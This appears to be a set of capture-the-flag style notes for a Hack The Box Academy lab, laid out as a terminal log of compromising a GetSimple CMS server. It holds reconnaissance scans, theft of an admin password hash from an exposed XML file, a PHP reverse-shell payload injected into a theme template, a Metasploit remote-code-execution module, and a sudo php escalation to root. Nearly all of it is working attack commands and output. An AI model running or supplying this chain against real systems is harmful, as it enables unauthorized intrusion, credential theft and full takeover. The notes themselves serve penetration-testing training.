+++
title = "Getting Started - Knowledge Check"
+++
# https://academy.hackthebox.com/beta/module/77/section/859

```bash
=================================
10.129.166.49 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.129.166.49' >> ~/.zshrc && source ~/.zshrc
echo "$TARGET TARGET" | sudo tee -a /etc/hosts

sudo nmap -n -Pn -sV -sC --open -oA nmap $TARGET
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/admin/

feroxbuster -t 64 -o feroxbuster_dir_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$TARGET

curl -Lo- http://10.129.166.49/data/users/admin.xml
// <item><USR>admin</USR><NAME/><PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD><EMAIL>admin@gettingstarted.com</EMAIL><HTMLEDITOR>1</HTMLEDITOR><TIMEZONE/><LANG>en_US</LANG></item>
// d033e22ae348aeb5660fc2140aec35850c4da997:admin
// CREDS: admin:admin

# Login here: http://10.129.166.49/admin/
# Edit theme with PHP shell: http://10.129.166.49/admin/theme-edit.php?t=Innovation&f=template.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'"); ?>

curl -o- http://10.129.166.49/data/cache/2a4c6447379fba09620ba05582eb61af.txt
// {"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}

use exploit/multi/http/getsimplecms_unauth_code_exec
set RHOSTS 10.129.166.49
set LHOST 10.10.14.166
run
// success!

cat /home/mrb3n/user.txt

sudo -l
// Matching Defaults entries for www-data on gettingstarted:
//     env_reset, mail_badpass,
//     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
// 
// User www-data may run the following commands on gettingstarted:
//     (ALL : ALL) NOPASSWD: /usr/bin/php

# https://gtfobins.github.io/gtfobins/php/#sudo
sudo php -r "system('bash');"
// root!

cat /root/root.txt
```